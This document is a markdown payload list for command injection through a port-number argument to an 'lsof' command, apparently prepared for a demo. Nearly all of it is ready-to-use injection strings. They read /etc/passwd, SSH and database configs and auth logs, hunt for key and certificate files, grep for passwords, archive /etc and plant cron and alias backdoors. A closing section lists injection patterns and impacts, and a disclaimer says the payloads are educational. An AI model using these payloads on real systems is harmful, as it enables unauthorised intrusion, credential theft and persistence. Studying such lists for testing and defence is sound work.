# Type Coercion Attack Payloads

## 🎯 Main Exploits (For Presentation)

### 1. Basic Type Coercion Attack
**Payload:** `8080; touch /tmp/owned; #`
**Effect:** Appends new command, leaves system marker
**Injected Command:** `lsof -t -i tcp:8080; touch /tmp/owned; #`

```bash
8080; touch /tmp/owned; #
8080; echo "HACKED" > /tmp/evil; #
8080; whoami > /tmp/user_info; #
8080; id > /tmp/identity; #
```

### 2. Information Gathering
**Payload:** `8080; uname -a > /tmp/system_info; #`
**Effect:** Gathers system information for reconnaissance

```bash
8080; uname -a > /tmp/system_info; #
8080; cat /etc/passwd > /tmp/passwd_copy; #
8080; ps aux > /tmp/processes; #
8080; netstat -tuln > /tmp/network; #
```

### 3. File System Manipulation
**Payload:** `8080; mkdir -p /tmp/backdoor; #`
**Effect:** Manipulates file system for persistence

```bash
8080; mkdir -p /tmp/backdoor; #
8080; rm -f /tmp/cleanup; #
8080; chmod 777 /tmp/evil_file; #
8080; ln -s /etc/passwd /tmp/passwd_link; #
```

### 4. Network Reconnaissance
**Payload:** `8080; ping -c 1 8.8.8.8 > /tmp/ping_test; #`
**Effect:** Performs network reconnaissance

```bash
8080; ping -c 1 8.8.8.8 > /tmp/ping_test; #
8080; curl -s http://ifconfig.me > /tmp/external_ip; #
8080; nslookup google.com > /tmp/dns_test; #
8080; traceroute 8.8.8.8 > /tmp/route_test; #
```

### 5. Data Exfiltration
**Payload:** `8080; tar -czf /tmp/data.tar.gz /etc/; #`
**Effect:** Exfiltrates sensitive data

```bash
8080; tar -czf /tmp/data.tar.gz /etc/; #
8080; find /home -name "*.txt" -exec cat {} \; > /tmp/text_files; #
8080; grep -r "password" /etc/ > /tmp/passwords; #
8080; cat /proc/version > /tmp/kernel_info; #
```

---

## 🔧 Additional Exploits (For Reference)

### Persistence Mechanisms
```bash
8080; echo "*/5 * * * * /tmp/backdoor.sh" >> /tmp/cron_job; #
8080; echo "alias ls='ls && /tmp/backdoor.sh'" >> /tmp/alias; #
8080; echo "export PATH=/tmp:$PATH" >> /tmp/path_mod; #
```

### Demonstration Payloads (Safe for Demo)
```bash
8080; touch /tmp/type_coercion_demo; #
8080; echo "Type coercion attack successful" > /tmp/demo_result; #
8080; date > /tmp/attack_timestamp; #
8080; echo $USER > /tmp/current_user; #
```

### Advanced Techniques
```bash
# Command chaining
8080; touch /tmp/file1 && echo "success" > /tmp/file2; #

# Conditional execution
8080; [ -f /etc/passwd ] && cat /etc/passwd > /tmp/exists; #

# Background execution
8080; nohup sleep 1000 > /tmp/background 2>&1 & #

# Environment variable manipulation
8080; export EVIL_VAR="malicious" && echo $EVIL_VAR > /tmp/env_test; #
```

### File System Enumeration
```bash
8080; find / -name "*.conf" -type f 2>/dev/null > /tmp/configs; #
8080; find / -name "*.key" -type f 2>/dev/null > /tmp/keys; #
8080; find / -name "*.pem" -type f 2>/dev/null > /tmp/certs; #
8080; find / -name "*.db" -type f 2>/dev/null > /tmp/databases; #
```

### Process Enumeration
```bash
8080; ps -ef > /tmp/all_processes; #
8080; pstree > /tmp/process_tree; #
8080; lsof -i > /tmp/network_connections; #
8080; netstat -tulpn > /tmp/listening_ports; #
```

### User Enumeration
```bash
8080; cat /etc/passwd | grep -v nologin > /tmp/users; #
8080; cat /etc/group > /tmp/groups; #
8080; who > /tmp/logged_users; #
8080; w > /tmp/active_users; #
```

### System Information
```bash
8080; cat /proc/cpuinfo > /tmp/cpu_info; #
8080; cat /proc/meminfo > /tmp/memory_info; #
8080; df -h > /tmp/disk_usage; #
8080; mount > /tmp/mounted_fs; #
```

### Network Information
```bash
8080; ip addr > /tmp/network_interfaces; #
8080; ip route > /tmp/routing_table; #
8080; cat /etc/hosts > /tmp/hosts_file; #
8080; cat /etc/resolv.conf > /tmp/dns_config; #
```

### Service Enumeration
```bash
8080; systemctl list-units --type=service > /tmp/services; #
8080; systemctl list-units --type=socket > /tmp/sockets; #
8080; systemctl list-units --type=timer > /tmp/timers; #
8080; systemctl list-units --type=target > /tmp/targets; #
```

### Configuration Files
```bash
8080; cat /etc/ssh/sshd_config > /tmp/ssh_config; #
8080; cat /etc/apache2/apache2.conf > /tmp/apache_config; #
8080; cat /etc/nginx/nginx.conf > /tmp/nginx_config; #
8080; cat /etc/mysql/my.cnf > /tmp/mysql_config; #
```

### Log Files
```bash
8080; tail -n 100 /var/log/auth.log > /tmp/auth_logs; #
8080; tail -n 100 /var/log/syslog > /tmp/system_logs; #
8080; tail -n 100 /var/log/apache2/access.log > /tmp/apache_logs; #
8080; journalctl --no-pager > /tmp/journal_logs; #
```

---

## 📊 Attack Analysis

### Common Patterns
1. **Command Separators:** `;`, `&&`, `||`, `|`
2. **Comment Characters:** `#`, `--`
3. **Subshell Execution:** `$()`, `\`\``
4. **Redirection:** `>`, `>>`, `<`

### Attack Vectors
1. **Direct Command Injection:** `8080; command; #`
2. **Parameter Pollution:** `8080 && command`
3. **Output Redirection:** `8080; command > file; #`
4. **Process Substitution:** `8080; command <(input); #`

### Impact Assessment
- **Information Disclosure:** System enumeration, file access
- **Data Exfiltration:** Sensitive file copying, network access
- **Privilege Escalation:** SUID exploitation, sudo abuse
- **Persistence:** Backdoor installation, cron jobs
- **Destruction:** File deletion, system corruption

---

**⚠️ WARNING: These payloads are for educational purposes only. Only use in isolated, controlled environments.** 